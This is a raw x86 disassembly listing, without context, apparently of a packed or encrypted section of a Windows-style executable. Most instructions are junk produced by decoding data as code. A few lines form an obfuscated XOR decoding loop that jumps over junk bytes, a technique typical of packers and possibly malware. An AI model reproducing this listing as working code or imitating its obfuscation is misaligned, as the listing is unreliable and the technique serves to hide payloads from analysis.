  4059bb:	mov    bh,0xf8
  4059bd:	(bad)  
  4059be:	cmp    BYTE PTR ds:0x51aacfd1,ch
  4059c4:	inc    ebp
  4059c5:	cmc    
  4059c6:	ja     0x4059c9
  4059c8:	adc    BYTE PTR [eax+ebp*1],cl
  4059cb:	sub    BYTE PTR [esi-0x46],bl
  4059ce:	cmp    eax,0x7a0c83a6
  4059d3:	push   eax
  4059d4:	inc    esi
  4059d5:	(bad)
  4059d9:	js     0x405a04
  4059db:	mov    dh,0x93
  4059dd:	rol    dh,cl
  4059df:	jg     0x40597d
  4059e1:	(bad)  
  4059e2:	nop
  4059e3:	xor    BYTE PTR [ecx+esi*2-0x3d84a9f3],bh
  4059ea:	das    
  4059eb:	xchg   esp,eax
  4059ec:	rcr    cl,1
  4059ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4059ef:	test   al,0xa9
  4059f1:	test   BYTE PTR [edi-0x6d],0x59
  4059f5:	inc    DWORD PTR [edi+0x1bfc108e]
  4059fb:	adc    BYTE PTR [esp+edi*1+0x1a],ch
  4059ff:	icebp  
  405a00:	out    0x55,eax
  405a02:	in     eax,dx
  405a03:	mov    ebp,0x13c451be
  405a08:	fstp   DWORD PTR [eax+0x30]
  405a0b:	add    dl,BYTE PTR [eax-0x40]
  405a0e:	and    edx,DWORD PTR [edi]
  405a10:	inc    ecx
  405a11:	repnz sahf 
  405a13:	pushf  
  405a14:	mov    ds:0xf4b5018c,al
  405a19:	(bad)
  405a1c:	popf   
  405a1d:	sbb    BYTE PTR [bx+si],bh
  405a20:	and    ah,BYTE PTR [eax]
  405a22:	dec    eax
  405a23:	sbb    ebp,DWORD PTR ds:0xcfbfe952
  405a29:	xchg   edx,eax
  405a2a:	jge    0x405aa7
  405a2c:	loop   0x405a2a
  405a2e:	mov    esp,DWORD PTR [eax]
  405a30:	or     al,0xc2
  405a32:	aam    0x3d
  405a34:	out    0x56,eax
  405a36:	cmp    cl,dh
  405a38:	sar    BYTE PTR [edx+0x32],0x26
  405a3c:	add    eax,0x96b01e1c
  405a41:	loope  0x405a9b
  405a43:	xchg   esp,eax
  405a44:	and    al,0x34
  405a46:	bnd je 0x405a41
  405a49:	dec    edi
  405a4a:	gs push ds
  405a4c:	mov    edx,0x564a0ece
  405a51:	sahf   
  405a52:	hlt    
  405a53:	ds and al,0x2d
  405a56:	adc    ecx,DWORD PTR [ebx+0x7705554a]
  405a5c:	push   es
  405a5d:	fiadd  WORD PTR [eax-0x20]
  405a60:	inc    eax
  405a61:	lea    esi,[ebx+0x3]
  405a64:	shl    ch,0x70
  405a67:	add    eax,0x735b43f9
  405a6c:	popf   
  405a6d:	(bad)  
  405a6e:	mov    dl,0x8e
  405a70:	mov    al,ds:0xbda6d1e5
  405a75:	or     eax,0xecb577e3
  405a7a:	(bad)  
  405a7b:	pusha  
  405a7c:	xor    DWORD PTR [ebx-0x4b],edx
  405a7f:	adc    edx,esp
  405a81:	jge    0x405a19
  405a83:	push   edi
  405a84:	icebp  
  405a85:	dec    ebx
  405a86:	ret    
  405a87:	enter  0x8395,0x19
  405a8b:	lock test eax,0xfdb64a66
  405a91:	or     eax,0xa9315099
  405a96:	or     DWORD PTR [ebx+0x47],ebp
  405a99:	dec    esi
  405a9a:	or     dl,BYTE PTR [ebx]
  405a9c:	lods   eax,DWORD PTR ds:[esi]
  405a9d:	mov    edx,0x676bab9
  405aa2:	mov    ds:0xa5e97220,al
  405aa7:	lahf   
  405aa8:	scas   al,BYTE PTR es:[edi]
  405aa9:	mov    dl,0x95
  405aab:	jle    0x405a9d
  405aad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405aae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405aaf:	cmp    BYTE PTR [eax],al
  405ab1:	jle    0x405b0a
  405ab3:	in     al,dx
  405ab4:	push   esi
  405ab5:	add    al,0x85
  405ab7:	xlat   BYTE PTR ds:[ebx]
  405ab8:	out    dx,eax
  405ab9:	out    dx,eax
  405aba:	jle    0x405af5
  405abc:	call   0xf079bb3a
  405ac1:	jmp    0x405b2c
  405ac3:	repz inc esi
  405ac5:	or     DWORD PTR [edi],ebp
  405ac7:	sbb    DWORD PTR [edi],ebp
  405ac9:	sub    al,0x85
  405acb:	cmp    DWORD PTR [edx*8-0x7fd56f9d],0xffffffb2
  405ad3:	loope  0x405b40
  405ad5:	movsx  edx,BYTE PTR [edi-0x8b9d9f]
  405adc:	fiadd  WORD PTR [bp+si+0x79]
  405ae0:	imul   eax,DWORD PTR [ebp+ecx*2-0x6d],0xffffffc6
  405ae5:	jmp    0x29b0510e
  405aea:	dec    esp
  405aeb:	pusha  
  405aec:	fs xchg esp,eax
  405aee:	lds    ebp,FWORD PTR [ecx+0x14]
  405af1:	mov    edi,DWORD PTR ds:0xc490cf34
  405af7:	xchg   ebx,eax
  405af8:	in     eax,0x5f
  405afa:	push   0xffffffce
  405afc:	sbb    eax,0xe31d51bd
  405b01:	xchg   BYTE PTR ds:0xf49bccfd,bl
  405b07:	jnp    0x405a9e
  405b09:	ret    
  405b0a:	pop    ebp
  405b0b:	pop    ecx
  405b0c:	cmp    BYTE PTR [ebx+0x16e49406],dl
  405b12:	sbb    BYTE PTR [ecx],al
  405b14:	and    al,dl
  405b16:	push   ecx
  405b17:	in     eax,dx
  405b18:	jp     0x405b72
  405b1a:	(bad)  
  405b1b:	(bad)  
  405b1d:	push   DWORD PTR [ecx+0x6b]
  405b20:	loop   0x405acc
  405b22:	cmp    BYTE PTR [ebp+0x566b02ba],cl
  405b28:	xchg   edx,eax
  405b29:	mov    bl,0x46
  405b2b:	call   0x9747:0x38742277
  405b32:	and    DWORD PTR [edx-0x37],0xffffffa7
  405b36:	sar    DWORD PTR [edi],0xc6
  405b39:	nop
  405b3a:	jg     0x405baa
  405b3c:	mov    eax,ds:0x5eb4de38
  405b41:	xchg   BYTE PTR [edi-0x3b],cl
  405b44:	inc    ecx
  405b45:	dec    ecx
  405b46:	push   esp
  405b47:	cdq    
  405b48:	retf   
  405b49:	cmp    bh,bl
  405b4b:	mov    DWORD PTR [ebx+0x75],esi
  405b4e:	push   esi
  405b4f:	xor    bh,ch
  405b51:	cmp    edi,ebx
  405b53:	fld    TBYTE PTR [eax-0x7abf9a51]
  405b59:	inc    dx
  405b5b:	add    DWORD PTR [edi+0x652809e6],0x76
  405b62:	lock stos BYTE PTR es:[edi],al
  405b64:	(bad)  
  405b65:	sub    edx,DWORD PTR [esi-0x4d5698a8]
  405b6b:	mov    esp,0xf4cc93d4
  405b70:	mov    edi,0x127310d
  405b75:	push   eax
  405b76:	jge    0x405b24
  405b78:	cmp    BYTE PTR [esi+0x2920d0f4],al
  405b7e:	xor    DWORD PTR [ebx-0x8],esi
  405b81:	push   ebp
  405b82:	cmp    dh,BYTE PTR [eax]
  405b84:	cmc    
  405b85:	add    ch,ah
  405b87:	dec    ecx
  405b88:	pop    esi
  405b89:	call   0x7df33b63
  405b8e:	push   esi
  405b8f:	dec    esi
  405b90:	pop    ebp
  405b91:	stos   DWORD PTR es:[edi],eax
  405b92:	retf   
  405b93:	stc    
  405b94:	xlat   BYTE PTR ds:[ebx]
  405b95:	mov    ecx,0xc77ea084
  405b9a:	(bad)  
  405b9c:	mov    dl,0xfd
  405b9e:	and    al,0x49
  405ba0:	in     eax,0xa1
  405ba2:	adc    BYTE PTR [ebp-0x27e767a2],ah
  405ba8:	leave  
  405ba9:	call   0x2ced:0xdf81edb1
  405bb0:	jp     0x405be2
  405bb2:	call   0x853e05eb
  405bb7:	out    0xf8,al
  405bb9:	popf   
  405bba:	push   ds
  405bbb:	out    0x23,eax
  405bbd:	and    eax,0x63899dd1
  405bc2:	add    esi,eax
  405bc4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405bc5:	jb     0x405be2
  405bc7:	jle    0x405c05
  405bc9:	mov    ch,0x39
  405bcb:	sub    eax,0x4511f80f
  405bd0:	call   0xecf50541
  405bd5:	int    0x93
  405bd7:	cld    
  405bd8:	mov    bh,0xa6
  405bda:	xchg   ecx,eax
  405bdb:	mov    eax,ds:0xb4f0d1ff
  405be0:	nop
  405be1:	stos   BYTE PTR es:[edi],al
  405be2:	jge    0x405b7d
  405be4:	dec    edx
  405be5:	add    ebp,esp
  405be7:	jp     0x405bdf
  405be9:	sahf   
  405bea:	jge    0x405c36
  405bec:	ins    BYTE PTR es:[edi],dx
  405bed:	fmul   DWORD PTR [esi+0x1eddff95]
  405bf3:	and    ecx,ecx
  405bf5:	jmp    0xbffa:0xb798e909
  405bfc:	push   0x875a5324
  405c01:	sub    eax,0x4abb3ae8
  405c06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405c07:	fs cld 
  405c09:	sub    ecx,DWORD PTR [esp+eiz*2+0x2b9107ee]
  405c10:	clc    
  405c11:	add    edi,DWORD PTR [ebp+0x10]
  405c14:	xor    edx,ecx
  405c16:	add    edx,esi
  405c18:	cmp    edx,edi
  405c1a:	ja     0x406428
  405c20:	push   ebx
  405c21:	jmp    0x405c2b
  405c26:	mov    esi,0x32729d
  405c2b:	mov    eax,DWORD PTR [ebp-0x8]
  405c2e:	mov    edi,DWORD PTR [ebp-0x4]
  405c31:	xor    edi,ecx
  405c33:	jmp    0x40600f
  405c38:	test   DWORD PTR [edx-0x7c],0x79ec5dea
  405c3f:	arpl   WORD PTR ds:0x8a5d0ed0,dx
  405c45:	gs test al,0x20
  405c48:	push   eax
  405c49:	cmp    edi,DWORD PTR [esi+0x7e]
  405c4c:	mov    ebp,0xc7e7e71
  405c51:	push   es
  405c52:	or     bh,BYTE PTR [edi]
  405c54:	int    0xe5
  405c56:	pop    ecx
  405c57:	(bad)  
  405c58:	lds    edi,FWORD PTR [edx-0x29f64d4e]
  405c5e:	cmp    BYTE PTR [eax+ebp*4+0x4],bh
  405c62:	or     DWORD PTR [edi-0x53fd7d18],ecx
  405c68:	outs   dx,BYTE PTR ds:[esi]
  405c69:	xchg   edi,eax
  405c6a:	jnp    0x405c17
  405c6c:	je     0x405c6d
  405c6e:	outs   dx,DWORD PTR ds:[esi]
  405c6f:	add    dh,BYTE PTR [eax+0x25]
  405c72:	push   ss
  405c73:	sub    ah,BYTE PTR [ecx]
  405c75:	mov    bl,0x17
  405c77:	push   ebp
  405c78:	out    dx,eax
  405c79:	lods   al,BYTE PTR ds:[esi]
  405c7a:	inc    esp
  405c7b:	jp     0x405c7a
  405c7d:	push   edi
  405c7e:	retf   0x4d46
  405c81:	push   edx
  405c82:	jmp    0x405ccf
  405c84:	into   
  405c85:	mov    bh,0x96
  405c87:	add    eax,0x97db49fd
  405c8c:	fwait
  405c8d:	adc    edi,DWORD PTR es:[eax-0x69bb3a4]
  405c94:	popa   
  405c95:	fisubr DWORD PTR [esi+0x78a6665a]
  405c9b:	cmp    DWORD PTR [edi-0x32],ebp
  405c9e:	xor    eax,0xd72a876d
  405ca3:	(bad)  
  405ca4:	in     eax,0x6b
  405ca6:	(bad)  
  405ca7:	push   edi
  405ca8:	in     al,0x86
  405caa:	stos   DWORD PTR es:[edi],eax
  405cab:	xchg   esi,eax
  405cac:	pop    es
  405cad:	push   es
  405cae:	mov    ds:0x3412e44c,eax
  405cb3:	fstp   TBYTE PTR [ebp+0x51]
  405cb6:	dec    edx
  405cb7:	xchg   BYTE PTR [ebp-0x5e],ah
  405cba:	fmul   st(4),st
  405cbc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405cbd:	loope  0x405ce5
  405cbf:	mov    bh,0xaa
  405cc1:	aad    0x1
  405cc3:	fdivr  DWORD PTR [eax]
  405cc5:	outs   dx,DWORD PTR ds:[esi]
  405cc6:	adc    bh,al
  405cc8:	mov    al,ds:0x5f880df4
  405ccd:	rcl    cl,cl
  405ccf:	retf   
  405cd0:	out    0x4b,eax
  405cd2:	cmp    al,BYTE PTR [esi]
  405cd4:	iret   
  405cd5:	mov    ds:0x5b890a9f,al
  405cda:	repz jge 0x405d12
  405cdd:	jp     0x405cdc
  405cdf:	scas   al,BYTE PTR es:[edi]
  405ce0:	or     edi,eax
  405ce2:	jae    0x405c9f
  405ce4:	dec    ebx
  405ce5:	dec    ebx
  405ce6:	mov    ch,0x57
  405ce8:	sub    eax,0xc4c73c33
  405ced:	push   ss
  405cee:	out    0x85,al
  405cf0:	cmp    DWORD PTR [edx-0x4a],eax
  405cf3:	sahf   
  405cf4:	and    bh,0xab
  405cf7:	inc    edi
  405cf8:	add    BYTE PTR [edx+0x50d1c13],al
  405cfe:	xchg   ecx,eax
  405cff:	pop    esp
  405d00:	sub    al,0x14
  405d02:	pop    ebx
  405d03:	daa    
  405d04:	stos   BYTE PTR es:[edi],al
  405d05:	ins    BYTE PTR es:[edi],dx
  405d06:	dec    edx
  405d07:	pop    eax
  405d08:	sbb    eax,0xc5708f8b
  405d0d:	(bad)  
  405d0e:	jecxz  0x405d70
  405d10:	loop   0x405ccd
  405d12:	mov    ah,0xd9
  405d14:	sbb    bh,BYTE PTR [ebp-0x32]
  405d17:	test   eax,0x3838223e
  405d1c:	dec    edi
  405d1d:	out    dx,eax
  405d1e:	scas   eax,DWORD PTR es:[edi]
  405d1f:	stc    
  405d20:	add    DWORD PTR [ebx+0x2b613ca6],ecx
  405d26:	(bad)  
  405d27:	adc    eax,0xf6394435
  405d2c:	xor    edx,eax
  405d2e:	jno    0x405d74
  405d30:	es and ebp,esi
  405d33:	call   0xf4b6:0x147f34df
  405d3a:	xchg   ecx,eax
  405d3b:	outs   dx,DWORD PTR ds:[esi]
  405d3c:	aas    
  405d3d:	push   esi
  405d3e:	fisub  DWORD PTR [ebp+0x79261aee]
  405d44:	outs   dx,BYTE PTR ds:[esi]
  405d45:	mov    edi,0xd8f939a8
  405d4a:	or     eax,0x10e9ad00
  405d4f:	aaa    
  405d50:	test   al,0x4d
  405d52:	pop    esp
  405d53:	cld    
  405d54:	lods   al,BYTE PTR ds:[esi]
  405d55:	clc    
  405d56:	fidivr WORD PTR [edx]
  405d58:	jae    0x405d03
  405d5a:	mul    BYTE PTR [eax+0x30aabc8f]
  405d60:	pop    ss
  405d61:	xor    DWORD PTR [edx+eax*2],ecx
  405d64:	lods   eax,DWORD PTR ds:[esi]
  405d65:	jns    0x405d28
  405d67:	in     ax,0x6c
  405d6a:	int    0x65
  405d6c:	test   DWORD PTR [ebx],esi
  405d6e:	je     0x405d02
  405d70:	or     al,0x66
  405d72:	or     al,0x6a
  405d74:	jo     0x405d6d
  405d76:	popa   
  405d77:	js     0x405dc5
  405d79:	jp     0x405de6
  405d7b:	test   DWORD PTR [ebp-0x56],esi
  405d7e:	das    
  405d7f:	aaa    
  405d80:	out    dx,al
  405d81:	in     ax,dx
  405d83:	adc    DWORD PTR [edi-0xf],ebp
  405d86:	fnstenv [eax+esi*2-0x45cc0933]
  405d8d:	lahf   
  405d8e:	ja     0x405da1
  405d90:	mov    edi,0x814b2fef
  405d95:	in     eax,dx
  405d96:	mov    al,0xe
  405d98:	sub    DWORD PTR [ebx-0x3e67b7a6],0x1b9c8276
  405da2:	mov    cl,0x7d
  405da4:	cmp    al,0x5
  405da7:	ds ja  0x405de9
  405daa:	hlt    
  405dab:	push   ebp
  405dac:	mov    ebp,0xa9954f8a
  405db1:	fwait
  405db2:	mov    esp,0x5c6f0d92
  405db7:	push   edx
  405db8:	arpl   WORD PTR [ecx+0x2f],di
  405dbb:	pop    ebp
  405dbc:	leave  
  405dbd:	add    esp,DWORD PTR [ebp-0x6429bd34]
  405dc3:	pop    edx
  405dc4:	or     DWORD PTR [edi],esi
  405dc6:	push   edi
  405dc7:	mov    cl,0x67
  405dc9:	cs mov bl,0x9e
  405dcc:	jae    0x405d6a
  405dce:	mov    dh,0x72
  405dd0:	stc    
  405dd1:	pop    ss
  405dd2:	adc    BYTE PTR [edi],bh
  405dd4:	ret    
  405dd5:	dec    ecx
  405dd6:	sub    ch,cl
  405dd8:	push   eax
  405dd9:	and    esi,DWORD PTR [ebx+0x155aa0d6]
  405ddf:	ins    BYTE PTR es:[edi],dx
  405de0:	jl     0x405e24
  405de2:	aad    0x6b
  405de4:	retf   
  405de5:	and    eax,0x81b96163
  405dea:	js     0x405e0e
  405dec:	sub    al,BYTE PTR [eax-0x6c]
  405def:	push   ss
  405df0:	sti    
  405df1:	ret    
  405df2:	mov    esp,ebx
  405df4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405df5:	pushf  
  405df6:	retf   0xcd0d
  405df9:	and    DWORD PTR [edi+eax*4-0x29],esp
  405dfd:	dec    edi
  405dfe:	xchg   edi,ecx
  405e00:	or     esi,ebx
  405e02:	scas   eax,DWORD PTR es:[edi]
  405e03:	pop    ds
  405e04:	out    0x5e,eax
  405e06:	push   ebx
  405e07:	mov    cl,0xe1
  405e09:	pop    ebx
  405e0a:	out    dx,al
  405e0b:	in     eax,0xcf
  405e0d:	out    0xb8,al
  405e0f:	(bad)  
  405e11:	test   BYTE PTR [edx+ebx*8-0x6ea1b367],bl
  405e18:	sub    eax,0xe6411eaa
  405e1d:	mov    dl,0x5
  405e1f:	jnp    0x405e19
  405e21:	sub    al,0xfa
  405e23:	push   esp
  405e24:	mov    ecx,esi
  405e26:	call   0xdde18805
  405e2b:	out    0x3f,al
  405e2d:	sub    BYTE PTR [edx-0x6c],ch
  405e30:	test   DWORD PTR [esi-0x76],ebp
  405e33:	pop    ecx
  405e34:	cld    
  405e35:	cmp    BYTE PTR [esi],dh
  405e37:	(bad)  
  405e39:	lds    ebx,FWORD PTR [edi+0x56]
  405e3c:	jb     0x405e87
  405e3e:	inc    ecx
  405e3f:	les    edx,FWORD PTR [eax-0x75f4be5b]
  405e45:	cwde   
  405e46:	mov    ds:0x244e2db2,eax
  405e4b:	pop    edx
  405e4c:	mov    bh,0xa
  405e4e:	fisttp QWORD PTR [ebx]
  405e50:	mov    al,0x9e
  405e52:	cmp    edx,DWORD PTR [ecx]
  405e54:	xor    eax,0xcc64d248
  405e59:	cmp    edx,ebp
  405e5b:	jmp    0xb892ecbd
  405e60:	push   edx
  405e61:	xchg   esp,eax
  405e62:	jns    0x405e1a
  405e64:	aam    0xdd
  405e66:	cdq    
  405e67:	dec    ebx
  405e68:	rol    BYTE PTR [ebx],cl
  405e6a:	add    bl,dh
  405e6c:	sub    cl,bl
  405e6e:	mov    ?,WORD PTR gs:[ecx-0x27cd5dde]
  405e75:	jmp    0x405ee7
  405e77:	fmul   DWORD PTR [ebx]
  405e79:	push   esi
  405e7a:	xchg   cl,al
  405e7c:	or     edx,DWORD PTR [edi-0x1007d620]
  405e82:	dec    ebx
  405e83:	inc    edx
  405e84:	mov    ebp,0x2af5ac3d
  405e89:	cmp    BYTE PTR [esi],cl
  405e8b:	dec    edx
  405e8c:	jbe    0x405f05
  405e8e:	in     al,0xae
  405e90:	adc    BYTE PTR [esi],cl
  405e92:	fdivr  QWORD PTR [ebp+eax*4-0x12]
  405e96:	mov    al,0x29
  405e98:	mov    ah,0xe1
  405e9a:	add    DWORD PTR [esi+0x28],ecx
  405e9d:	std    
  405e9e:	jge    0x405e88
  405ea0:	sbb    eax,0x28bab7e1
  405ea5:	ss cmp eax,0xf26da22a
  405eab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405eac:	lahf   
  405ead:	mov    ah,0x85
  405eaf:	call   0x527c9658
  405eb4:	xor    edi,ebx
  405eb6:	jl     0x405e39
  405eb8:	in     al,0x17
  405eba:	or     DWORD PTR [edi+0x1a],ebp
  405ebd:	mov    edi,0xaaabc484
  405ec2:	push   edx
  405ec3:	jno    0x405e71
  405ec5:	nop
  405ec6:	inc    eax
  405ec7:	mov    esi,0x5bb50f57
  405ecc:	and    eax,esp
  405ece:	push   ecx
  405ecf:	mov    ds:0xadcdf24b,eax
  405ed4:	js     0x405eb5
  405ed6:	repnz retf 0x1cb
  405eda:	inc    edx
  405edb:	mov    edi,0x41ef5ee1
  405ee0:	inc    ecx
  405ee1:	loop   0x405f28
  405ee3:	test   DWORD PTR [ecx-0x7e],ebx
  405ee6:	es ror ecx,1
  405ee9:	aad    0x6
  405eeb:	inc    DWORD PTR [esi+0xb]
  405eee:	rcr    ecx,1
  405ef0:	mov    DWORD PTR [bp-0x580b],ecx
  405ef5:	loop   0x405eba
  405ef7:	int3   
  405ef8:	int3   
  405ef9:	push   es
  405efa:	into   
  405efb:	(bad)  
  405efc:	fadd   DWORD PTR [esi]
  405efe:	int3   
  405eff:	add    BYTE PTR [edx],cl
  405f01:	cmp    al,0x1e
  405f03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405f04:	int3   
  405f05:	lds    esi,FWORD PTR [eax]
  405f07:	dec    ebp
  405f08:	pop    ebp
  405f09:	inc    ebx
  405f0a:	xor    BYTE PTR [edi+0x1],dl
  405f0d:	jns    0x405ecd
  405f0f:	jp     0x405f81
  405f11:	ror    BYTE PTR [ebx],0xb2
  405f14:	xchg   DWORD PTR ds:0x537412c8,esp
  405f1a:	push   esp
  405f1b:	fsub   QWORD PTR [ebx-0x2b]
  405f1e:	mov    edi,0x9ee6cf2f
  405f23:	xor    BYTE PTR [eax-0x10],bh
  405f26:	popf   
  405f27:	shl    DWORD PTR [ecx+0x6a],0xae
  405f2b:	mov    eax,0xd773487c
  405f30:	call   0xd21e:0x4e18e03
  405f37:	mov    bh,0x40
  405f39:	repnz push ecx
  405f3b:	pop    esp
  405f3c:	and    eax,0x887ca42d
  405f41:	jo     0x405fad
  405f43:	sar    DWORD PTR [eax+0x6e8dadf9],1
  405f49:	idiv   DWORD PTR [ebx-0x2f]
  405f4c:	retf   0xbda9
  405f4f:	sbb    bl,cl
  405f51:	sbb    DWORD PTR [edx-0x31842ec2],ebx
  405f57:	mov    dh,0xa0
  405f59:	in     al,0xa2
  405f5b:	out    dx,al
  405f5c:	sub    BYTE PTR [ecx],0x3f
  405f5f:	or     al,0xef
  405f61:	std    
  405f62:	mov    eax,0xceac9ec3
  405f67:	in     al,dx
  405f68:	mov    ebx,0xbfcdb27e
  405f6d:	into   
  405f6e:	repz sbb edi,edi
  405f71:	push   eax
  405f72:	dec    edx
  405f73:	push   0x8e86468e
  405f78:	icebp  
  405f79:	dec    ebx
  405f7a:	add    dl,BYTE PTR [esi+eiz*2+0x77]
  405f7e:	cld    
  405f7f:	jnp    0x405f1b
  405f81:	lods   eax,DWORD PTR ds:[esi]
  405f82:	aaa    
  405f83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405f84:	and    DWORD PTR [ebx+0x37f4bfd4],esp
  405f8a:	scas   al,BYTE PTR es:[edi]
  405f8b:	mov    al,0x67
  405f8d:	jb     0x405fbe
  405f8f:	je     0x405f68
  405f91:	and    al,0x5
  405f93:	out    dx,al
  405f94:	outs   dx,DWORD PTR ds:[esi]
  405f95:	xor    ecx,esp
  405f97:	ret    
  405f98:	inc    esp
  405f99:	into   
  405f9a:	adc    ecx,DWORD PTR [ebx-0x72c838ca]
  405fa0:	sbb    ch,BYTE PTR [ecx+0x71909f30]
  405fa6:	out    dx,eax
  405fa7:	mov    eax,0xef68a76a
  405fac:	adc    DWORD PTR [ecx-0x20268caa],ecx
  405fb2:	or     ebx,ecx
  405fb4:	pusha  
  405fb5:	out    0xec,eax
  405fb7:	loope  0x405f73
  405fb9:	rcl    DWORD PTR [ecx+0x2c142d87],1
  405fbf:	sub    al,0xc0
  405fc1:	test   eax,0x7e020077
  405fc6:	push   edx
  405fc7:	jno    0x40601c
  405fc9:	push   eax
  405fca:	pop    es
  405fcb:	adc    ah,bl
  405fcd:	scas   al,BYTE PTR es:[edi]
  405fce:	xor    esi,DWORD PTR [edi]
  405fd0:	add    DWORD PTR [ecx-0x18],esi
  405fd3:	clc    
  405fd4:	data16 mov bh,0xb8
  405fd7:	popa   
  405fd8:	push   ecx
  405fd9:	mov    ch,0x80
  405fdb:	clc    
  405fdc:	mov    WORD PTR [esi+0x46159a2c],fs
  405fe2:	push   ecx
  405fe3:	push   cs
  405fe4:	je     0x40603a
  405fe6:	and    BYTE PTR ds:0x52132c4f,al
  405fec:	loope  0x40601f
  405fee:	adc    DWORD PTR [edi+esi*1-0x93754bf],0x5dcf387f
  405ff9:	repz rcr DWORD PTR [ebx-0x32],0x11
  405ffe:	bound  ecx,QWORD PTR [edi-0x5ce2bb5]
  406004:	jno    0x405fb4
  406006:	retf   0xc67e
  406009:	xchg   esp,eax
  40600a:	sub    al,0x19
  40600c:	rol    DWORD PTR [edx],cl
  40600e:	mov    ebp,0x758bfe03
  406013:	or     BYTE PTR [edi],cl
  406015:	scas   eax,DWORD PTR es:[edi]
  406016:	cli    
  406017:	mov    ebx,DWORD PTR [ebp+0xc]
  40601a:	xor    eax,ecx
  40601c:	add    eax,edx
  40601e:	mov    al,BYTE PTR [ebx+eax*1+0x32729d]
  406025:	mov    BYTE PTR [edi+esi*1],al
  406028:	mov    eax,DWORD PTR [ebp-0x4]
  40602b:	xor    eax,ecx
  40602d:	lea    edx,[edx+eax*1+0x32729d]
  406034:	mov    eax,DWORD PTR [ebp-0x4]
  406037:	xor    eax,ecx
  406039:	mov    esi,0xffcd8d63
  40603e:	sub    esi,eax
  406040:	add    esi,DWORD PTR [ebp+0x10]
  406043:	cmp    edx,esi
  406045:	jmp    0x406421
  40604a:	fdivr  st(7),st
  40604c:	es fwait
  40604e:	jge    0x40600b
  406050:	jge    0x40609b
  406052:	jae    0x4060cf
  406054:	dec    edx
  406055:	pusha  
  406056:	es (bad) 
  406058:	stos   DWORD PTR es:[edi],eax
  406059:	nop
  40605a:	lahf   
  40605b:	aas    
  40605c:	jle    0x4060dc
  40605e:	mov    ebp,0x9d7e7e71
  406063:	sbb    ebx,DWORD PTR [edi-0x2ef280ab]
  406069:	sbb    eax,0xe37af22a
  40606e:	dec    eax
  40606f:	fimul  DWORD PTR [ebx]
  406071:	or     BYTE PTR [edi+0x5abc8c8],al
  406077:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406078:	popf   
  406079:	stos   BYTE PTR es:[edi],al
  40607a:	jbe    0x4060c5
  40607c:	mov    ecx,0x2b30dc9c
  406081:	popa   
  406082:	inc    edx
  406083:	outs   dx,DWORD PTR ds:[esi]
  406084:	js     0x4060b2
  406086:	adc    dl,al
  406088:	dec    esi
  406089:	pop    edi
  40608a:	ror    DWORD PTR [esi],cl
  40608c:	cmp    BYTE PTR [ebx],0x69
  40608f:	inc    eax
  406090:	in     al,dx
  406091:	push   ecx
  406092:	inc    edi
  406093:	push   cs
  406094:	adc    bl,BYTE PTR [eax-0x2a]
  406097:	dec    esp
  406098:	aam    0x8e
  40609a:	stos   DWORD PTR es:[edi],eax
  40609b:	cwde   
  40609c:	lods   al,BYTE PTR ds:[esi]
  40609d:	test   eax,0x7de312ad
  4060a2:	ret    
  4060a3:	gs push eax
  4060a5:	mov    eax,0x90977948
  4060aa:	jae    0x406065
  4060ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4060ad:	retf   
  4060ae:	cmp    dl,BYTE PTR [edx]
  4060b0:	dec    ebx
  4060b1:	popa   
  4060b2:	div    BYTE PTR [ebx+esi*2-0x1b]
  4060b6:	stc    
  4060b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4060b8:	inc    ecx
  4060b9:	and    al,BYTE PTR [ebp+ecx*8-0x3580837e]
  4060c0:	adc    eax,DWORD PTR [esi+0x9]
  4060c3:	sar    DWORD PTR [edi+0x5799bccf],0x6f
  4060ca:	sub    DWORD PTR [edx+0x3cbf7807],esp
  4060d0:	ins    BYTE PTR es:[edi],dx
  4060d1:	jnp    0x406111
  4060d3:	adc    eax,0x1919a06d
  4060d8:	sbb    eax,DWORD PTR [ebx]
  4060da:	sbb    eax,0x52ee8852
  4060df:	pop    es
  4060e0:	sbb    al,0xc0
  4060e2:	ins    BYTE PTR es:[edi],dx
  4060e3:	inc    esp
  4060e4:	push   eax
  4060e5:	arpl   WORD PTR [ebx-0xb],dx
  4060e8:	lahf   
  4060e9:	push   cs
  4060ea:	int    0x97
  4060ec:	or     BYTE PTR [eax+0x1b],dh
  4060ef:	mov    esp,0x74263643
  4060f4:	inc    ebx
  4060f5:	mov    ebx,0x23ff7b07
  4060fa:	and    DWORD PTR [esi],0xffffffd2
  4060fd:	aad    0x66
  4060ff:	and    esp,DWORD PTR [esp+edx*8+0x3]
  406103:	fsub   DWORD PTR [ecx+0x47]
  406106:	cmp    cl,al
  406108:	(bad)  
  406109:	sbb    al,0x5f
  40610b:	std    
  40610c:	push   ebp
  40610d:	(bad)  
  40610e:	jne    0x4060b4
  406110:	jge    0x406184
  406112:	inc    ecx
  406113:	cmp    BYTE PTR [ecx+edx*4+0x6b],al
  406117:	test   eax,0x449fcb5d
  40611c:	push   ebp
  40611d:	es cwde 
  40611f:	fimul  WORD PTR [ebx-0x30]
  406122:	je     0x4060b1
  406124:	xchg   ebp,eax
  406125:	cmp    esi,DWORD PTR [edi+0x693a0767]
  40612b:	jle    0x4060b5
  40612d:	jmp    0xef3d:0x8f2795f1
  406134:	out    dx,eax
  406135:	shl    BYTE PTR [eax+0x7b],cl
  406138:	mov    al,0x3c
  40613a:	test   eax,0xea7e9399
  40613f:	add    BYTE PTR fs:[edx],bl
  406142:	sti    
  406143:	shl    al,cl
  406145:	je     0x40617e
  406147:	or     BYTE PTR [eax+eax*8],cl
  40614a:	jne    0x4060ff
  40614c:	les    ecx,FWORD PTR [ebx+0x0]
  40614f:	arpl   WORD PTR [ebx],sp
  406151:	ds popf 
  406153:	fwait
  406154:	add    al,0x9b
  406156:	dec    eax
  406157:	push   esi
  406158:	or     ebp,esp
  40615a:	dec    ebx
  40615b:	es mov bh,0x36
